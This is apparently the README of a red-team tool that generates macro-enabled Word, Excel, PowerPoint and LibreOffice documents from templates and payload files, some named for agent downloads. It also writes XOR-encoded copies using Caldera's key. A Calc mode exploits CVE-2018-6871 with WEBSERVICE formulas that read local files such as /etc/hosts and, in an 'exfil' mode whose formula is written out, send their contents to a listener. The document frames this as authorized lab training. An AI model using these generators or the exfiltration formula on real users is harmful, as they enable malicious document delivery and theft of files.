# macro_generator

## Config file

#### Files

Templates are selected directly by filename from the relevant folder; they are not listed in `config.yml`.

#### Macros

Macro payloads are selected directly from `templates/macros/ms_office` or `templates/macros/libre_office`.

#### App

#### Generators

Run the interactive generator prompt with:

```text
python main.py
```

It discovers available templates and macro payloads from the folders and lets you choose both.

For a non-interactive one-liner, pass the file type, template filename, and macro payload filename:

```text
python main.py writer Vyplatka.odt training_simulation.bas
python main.py word Handover_Protocol.docx agent_download.txt
python main.py excel Weekly_Task_Tracker.xlsx agent_download.txt
python main.py powerpoint Project_Status_Report_EN.pptx agent_download.txt
```

```text
python generators/word_file_generator.py <template_name> <macro_name>
python generators/writer_file_generator.py <template_name> <macro_name>
python generators/excel_file_generator.py <template_name> <macro_name>
python generators/powerpoint_file_generator.py <template_name> <macro_name>
```

Word, Excel, and PowerPoint templates are read from `templates/files/ms_office`; Writer templates are read from `templates/files/libre_office`.

LibreOffice payloads must be `.bas` files containing an inert, manually started
Basic procedure. The generator embeds the source in the document's `Standard`
library, but does not configure an open event or execute it. Shell, network,
file-changing, process-launch, and autorun patterns are rejected. The old
LibreOffice `test.txt` payload is not a Basic macro and is intentionally not
offered by the interactive menu.

### XOR-encoded output

Every generator also writes an XOR-encoded copy of each generated file next to
the plain one, using a repeating-key XOR and the `.xored` suffix:

```text
output/Handover_Protocol.docm        # plain macro-enabled document
output/Handover_Protocol.docm.xored  # XOR-encoded copy
```

The key comes from `app.xor.key` in `config.yml`; the default
`0x324532CA` is Caldera's repeating XOR key from `payload_encoder.py`
(`DEFAULT_KEY = [0x32, 0x45, 0x32, 0xca]`). Use a plain string (UTF-8 bytes)
or a hex value such as `0x55` for a single-byte key. XOR is symmetric, so
applying the same operation again restores the original:

```text
python -m utils.xor output/Handover_Protocol.docm.xored
```

This restores `output/Handover_Protocol.docm`; running `python -m utils.xor`
on the plain file encodes it to `.xored`. The plain file is always kept
alongside the `.xored` copy.

### Safe LibreOffice training generator

For a passive LibreOffice Writer training artifact, use the dedicated safe
generator:

```text
python main.py libreoffice-training --include-safe-macro
```

This creates `output/Security_Awareness_Exercise.odt` and, when requested, a
companion `output/Security_Awareness_Exercise.bas`. The ODT contains no
embedded or autorun macro. The companion Basic source is intentionally inert:
it only checks for `C:\\vycvikove_stredisko.txt` or
`/vycvikove_stredisko.txt` when started manually and displays a message. It
does not execute commands, modify files, or make network connections.

The generator can also be called directly:

```text
python generators/libreoffice_training_generator.py \
  --output output/security_exercise.odt \
  --title "Security Awareness Exercise Notice" \
  --include-safe-macro
```

The older macro-import generators and payload templates are not used by this
safe training path.

### Calc WEBSERVICE file-read generator

For a LibreOffice Calc training artifact that demonstrates the
`WEBSERVICE("file://...")` local-file-read primitive (CVE-2018-6871), use:

```text
python main.py calc --output webservice_exercise.fods \
  --files "C:\path\to\file.txt" "/etc/hosts"
python generators/calc_file_generator.py \
  --output output/webservice_exercise.fods \
  --files "C:\path\to\file.txt" "/etc/hosts"
```

Each requested path becomes a cell with `=WEBSERVICE("file:///...")`. When the
sheet is opened in the pinned LibreOffice 5.4.4 lab build, the formula reads
the file and returns its text into the cell.

#### Exfiltration mode

Add `--mode exfil` to read each file and send its text to a listener by
concatenating the URL-encoded result into a second request:

```text
python main.py calc --mode exfil --files "C:\path\to\secret.txt"
python generators/calc_file_generator.py --mode exfil \
  --files "C:\path\to\secret.txt" "/etc/hosts"
```

This emits, per file:

```text
=WEBSERVICE("http://<listener>/?f=<name>&d=" & ENCODEURL(WEBSERVICE("file:///...")))
```

The listener URL is read from `app.webservice.exfil_url` in `config.yml`
(default `http://127.0.0.1:8080/exfil`) and can be overridden with
`--exfil-url`. The receiving side sees a GET whose `f` parameter is the file
name and whose `d` parameter is the URL-encoded file text.

Scope and safety:

* Read-only file access: formulas read files; they do not modify files, launch
  processes, or execute code.
* Exfil mode is an outbound GET to the listener you configure. Point it only
  at a host you control for the exercise. There is no code execution and no
  download-and-execute stage.
* No privilege escalation: only files the LibreOffice process account can
  already read are returned.
* Authorized lab/training use only. LibreOffice 5.4.5+ / 6.0.2+ restrict
  WEBSERVICE to http(s) and reject file://, so this artifact targets the
  deliberately pinned 5.4.4 build.
* Keep exfiltrated files small: WEBSERVICE returns a limited amount of text
  and very long URLs are commonly rejected by the listener.

If a cell does not refresh on open, recalculate with Ctrl+Shift+F9 or set
Tools > Options > Calc > Formula > Recalculation on File Load to
"Always recalculate".


#### Setup

###### Ms Office

Must have installed ms office on computer
Before running the code you must have word app on your computer.
You must allow programmatic access to visual basic
 - Open word
 - Go to File -> Options -> Trust Center -> Trust Center Settings -> Trust access to the VBA project object model

###### Libre Office

Must have installed [LibreOffice 5.4.4](https://www.filehorse.com/download-libreoffice-64/33266/download/) office on computer - 
Add libre office to path - Ex. C:\Program Files (x86)\LibreOffice 5\program
